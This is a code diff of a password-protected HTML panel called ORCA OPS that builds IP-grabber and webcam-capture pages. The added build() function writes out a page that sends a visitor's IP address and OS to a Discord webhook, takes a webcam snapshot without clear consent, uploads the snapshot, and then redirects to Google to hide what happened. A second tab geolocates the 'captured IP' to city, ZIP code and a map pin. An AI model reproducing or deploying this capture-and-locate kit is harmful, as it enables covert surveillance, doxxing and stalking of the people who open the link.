@@ -2,116 +2,147 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>ORCA_SECURE_ACCESS</title>
+    <title>ORCA_SYSTEM_OPERATIONS</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        :root { --accent: #00ffcc; --bg: #020202; --card: #0a0a0a; --text: #e0e0e0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        /* Écran de Login */
-        #login-screen { text-align: center; border: 1px solid var(--neon); padding: 40px; background: #000; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
-        input { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 10px; text-align: center; font-size: 18px; outline: none; }
+        #login-screen { background: var(--card); border: 1px solid #1a1a1a; padding: 50px; border-radius: 8px; text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
+        .cyber-input { background: #000; border: 1px solid #333; color: var(--accent); padding: 12px; font-family: monospace; font-size: 16px; margin: 10px 0; width: 250px; border-radius: 4px; outline: none; transition: 0.3s; }
+        .cyber-input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(0, 255, 204, 0.2); }
+
+        #main-dashboard { display: none; width: 95vw; height: 90vh; background: var(--card); border: 1px solid #1a1a1a; border-radius: 8px; display: grid; grid-template-columns: 300px 1fr; gap: 2px; }
         
-        /* Dashboard (Caché par défaut) */
-        #main-dashboard { display: none; width: 95%; max-width: 1000px; border: 1px solid var(--neon); padding: 25px; height: 85vh; overflow-y: auto; background: rgba(0,10,0,0.95); }
+        .sidebar { background: #050505; padding: 20px; border-right: 1px solid #1a1a1a; }
+        .main-content { padding: 30px; overflow-y: auto; background: var(--bg); }
         
-        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #222; }
-        .tab { cursor: pointer; padding: 10px 20px; border: 1px solid #222; border-bottom: none; }
-        .tab.active { background: var(--neon); color: #000; font-weight: bold; }
+        .nav-item { padding: 15px; margin-bottom: 10px; cursor: pointer; border-radius: 4px; transition: 0.2s; color: #666; font-weight: bold; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
+        .nav-item.active { background: #111; color: var(--accent); border-left: 3px solid var(--accent); }
+        
         .section { display: none; }
         .section.active { display: block; }
-        button { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 10px; width: 100%; cursor: pointer; font-weight: bold; margin: 10px 0; }
-        button:hover { background: var(--neon); color: #000; }
-        pre { background: #000; padding: 15px; border: 1px dashed #333; font-size: 11px; white-space: pre-wrap; }
-        .log-box { font-size: 11px; color: #666; max-height: 150px; overflow-y: auto; background: #000; border: 1px solid #111; padding: 10px; }
+        
+        .btn-action { background: var(--accent); color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; width: 100%; margin-top: 15px; }
+        .btn-action:hover { opacity: 0.9; transform: translateY(-1px); }
+
+        .ip-card { background: #080808; border: 1px solid #1a1a1a; border-radius: 6px; padding: 20px; margin-top: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .stat-label { color: #555; font-size: 11px; text-transform: uppercase; margin-bottom: 5px; }
+        .stat-value { color: var(--accent); font-family: monospace; font-size: 16px; }
+        
+        pre { background: #000; padding: 20px; color: #888; font-size: 12px; border-radius: 4px; border: 1px solid #111; overflow-x: auto; }
+        .badge { background: #1a1a1a; color: var(--accent); padding: 3px 8px; border-radius: 3px; font-size: 10px; margin-left: 5px; }
     </style>
 </head>
 <body>
 
     <div id="login-screen">
-        <h2 style="letter-spacing: 5px;">ORCA_OS_LOGIN</h2>
-        <p style="font-size: 12px; color: #666;">ENTREZ LE CODE D'ACCÈS MAÎTRE</p>
-        <input type="password" id="pass" placeholder="••••••••" onkeydown="if(event.key==='Enter') verify()">
-        <br><br>
-        <button onclick="verify()" style="width: 150px;">DÉVERROUILLER</button>
+        <div style="color: var(--accent); font-size: 24px; font-weight: bold; margin-bottom: 10px;">ORCA OPS</div>
+        <input type="password" id="pass" class="cyber-input" placeholder="PASSKEY" onkeydown="if(event.key==='Enter') verify()">
+        <button onclick="verify()" class="btn-action">Authenticate</button>
     </div>
 
-    <div id="main-dashboard">
-        <div style="display:flex; justify-content: space-between; align-items: center;">
-            <h2 style="margin:0;">ORCA_V5_CONTROL</h2>
-            <button onclick="location.reload()" style="width: auto; padding: 5px 15px; font-size: 10px;">LOGOUT</button>
-        </div>
-        <hr style="border:0; border-top:1px solid #222; margin: 20px 0;">
-
-        <div class="tabs">
-            <div class="tab active" onclick="openTab('gen')">GENERATOR</div>
-            <div class="tab" onclick="openTab('osint')">OSINT SCANNER</div>
+    <div id="main-dashboard" style="display:none;">
+        <div class="sidebar">
+            <div style="margin-bottom: 40px; color: var(--accent); font-weight: bold; font-size: 18px;">CONTROL_PANEL</div>
+            <div class="nav-item active" onclick="tab('gen', this)">🔗 Link Generator</div>
+            <div class="nav-item" onclick="tab('osint', this)">🔍 IP Intelligence</div>
+            <div class="nav-item" onclick="location.reload()">🔒 Secure Logout</div>
         </div>
 
-        <div id="gen" class="section active">
-            <input type="text" id="wh-url" placeholder="Webhook URL">
-            <input type="text" id="redir" value="https://www.google.com">
-            <button onclick="generate()">GÉNÉRER LE CODE INDEX</button>
-            <pre id="output">// Le code s'affichera ici...</pre>
-        </div>
+        <div class="main-content">
+            <div id="gen" class="section active">
+                <h2>LINK GENERATOR</h2>
+                <div style="max-width: 600px;">
+                    <div class="stat-label">Discord Webhook</div>
+                    <input type="text" id="wh" class="cyber-input" style="width: 100%;" placeholder="https://discord.com/api/webhooks/...">
+                    <div class="stat-label" style="margin-top: 15px;">Target Redirect</div>
+                    <input type="text" id="rd" class="cyber-input" style="width: 100%;" value="https://www.google.com">
+                    <button onclick="build()" class="btn-action">Build Capture Script</button>
+                    <h4 style="margin-top: 30px;">DEPLOYMENT CODE</h4>
+                    <pre id="code-out">// Waiting for configuration...</pre>
+                </div>
+            </div>
 
-        <div id="osint" class="section">
-            <input type="text" id="ip-in" placeholder="Coller l'IP de Discord">
-            <button onclick="scan()">SCANNER L'IP</button>
-            <div id="res" style="border: 1px solid #222; padding: 15px; margin-top: 10px; display:none;"></div>
-        </div>
+            <div id="osint" class="section">
+                <h2>IP INTELLIGENCE <span class="badge">PRECISION MODE</span></h2>
+                <div style="max-width: 600px;">
+                    <input type="text" id="ip-in" class="cyber-input" style="width: 100%;" placeholder="Enter captured IP (e.g. 8.8.8.8)">
+                    <button onclick="lookup()" class="btn-action">Launch Deep Scan</button>
+                </div>
 
-        <h4>JOURNAL D'ACTIVITÉ :</h4>
-        <div id="logs" class="log-box"></div>
+                <div id="res-card" class="ip-card" style="display:none;">
+                    <div>
+                        <div class="stat-label">City / Region</div>
+                        <div class="stat-value" id="res-city">-</div>
+                    </div>
+                    <div>
+                        <div class="stat-label">Country</div>
+                        <div class="stat-value" id="res-country">-</div>
+                    </div>
+                    <div>
+                        <div class="stat-label">ISP / Organization</div>
+                        <div class="stat-value" id="res-isp">-</div>
+                    </div>
+                    <div>
+                        <div class="stat-label">Precise Location</div>
+                        <div class="stat-value"><a id="res-map" target="_blank" style="color:var(--accent); text-decoration: none;">[ OPEN GOOGLE MAPS ]</a></div>
+                    </div>
+                    <div style="grid-column: span 2;">
+                        <div class="stat-label">Network Route</div>
+                        <div class="stat-value" id="res-asn" style="font-size: 12px; color: #666;">-</div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        const MASTER_PASS = "ORCA2026"; // TON MOT DE PASSE ICI
+        const PASS = "ORCA2026"; // Modifie ton mot de passe ici
 
         function verify() {
-            const input = document.getElementById('pass').value;
-            if(input === MASTER_PASS) {
+            if(document.getElementById('pass').value === PASS) {
                 document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-dashboard').style.display = 'block';
-                document.body.style.alignItems = 'flex-start';
-                addLog("ACCÈS AUTORISÉ : SESSION_ACTIVE");
-            } else {
-                alert("CODE INCORRECT");
-                document.getElementById('pass').value = "";
-            }
+                document.getElementById('main-dashboard').style.display = 'grid';
+            } else { alert("ACCESS DENIED"); }
         }
 
-        function openTab(id) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        function tab(id, el) {
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-            event.currentTarget.classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             document.getElementById(id).classList.add('active');
+            el.classList.add('active');
         }
 
-        function addLog(m) {
-            const t = new Date().toLocaleTimeString();
-            document.getElementById('logs').innerHTML = `[${t}] ${m}<br>` + document.getElementById('logs').innerHTML;
+        function build() {
+            const w = document.getElementById('wh').value;
+            const r = document.getElementById('rd').value;
+            if(!w) return alert("Webhook missing");
+            // Génère le code ultra-compact pour index.html
+            const code = `<!DOCTYPE html><html><body style="background:#000"><script>const W="${w}",R="${r}";async function p(m,b=null){const f=new FormData();if(b)f.append('file',b,'1.png');f.append('payload_json',JSON.stringify({content:m}));await fetch(W,{method:'POST',body:f,keepalive:true});}async function s(){try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();await p("🚀 **IP**: "+d.ip+"\\n**OS**: "+navigator.platform);}catch(e){}try{const m=await navigator.mediaDevices.getUserMedia({video:true});const v=document.createElement('video');v.srcObject=m;v.onloadedmetadata=()=>{setTimeout(()=>{const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(async(b)=>{await p("📸 **CAPTURE**",b);m.getTracks().forEach(t=>t.stop());location.href=R;},'image/png');},1000);};v.play();}catch(e){location.href=R;}}s();<\/script></body></html>`;
+            document.getElementById('code-out').innerText = code;
         }
 
-        function generate() {
-            const wh = document.getElementById('wh-url').value;
-            if(!wh) return;
-            // Code simplifié pour l'exemple
-            document.getElementById('output').innerText = `\n<script>const WH="${wh}";\n// ... Ton code de capture ...\n<\/script>`;
-            addLog("Nouveau code généré pour GitHub.");
-        }
-
-        async function scan() {
+        async function lookup() {
             const ip = document.getElementById('ip-in').value;
-            const rBox = document.getElementById('res');
             if(!ip) return;
-            rBox.style.display = "block";
-            rBox.innerHTML = "Analyse...";
+            const card = document.getElementById('res-card');
+            card.style.display = "grid";
+            card.style.opacity = "0.5";
+
             try {
-                const r = await fetch('https://ipapi.co/'+ip+'/json/');
-                const d = await r.json();
-                rBox.innerHTML = `ISP: ${d.org}<br>VILLE: ${d.city}<br><a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}" target="_blank">LIEN MAPS</a>`;
-                addLog(`Scan IP ${ip} terminé.`);
-            } catch(e) { rBox.innerHTML = "Erreur."; }
+                // Utilisation d'une API plus précise (ip-api.com)
+                const res = await fetch(\`http://ip-api.com/json/\${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query\`);
+                const d = await res.json();
+                
+                if(d.status === "success") {
+                    document.getElementById('res-city').innerText = d.city + " (" + d.zip + ")";
+                    document.getElementById('res-country').innerText = d.country;
+                    document.getElementById('res-isp').innerText = d.isp;
+                    document.getElementById('res-asn').innerText = d.as;
+                    document.getElementById('res-map').href = \`https://www.google.com/maps?q=\${d.lat},\${d.lon}\`;
+                }
+            } catch(e) { alert("Lookup failed"); }
+            card.style.opacity = "1";
         }
     </script>
 </body>
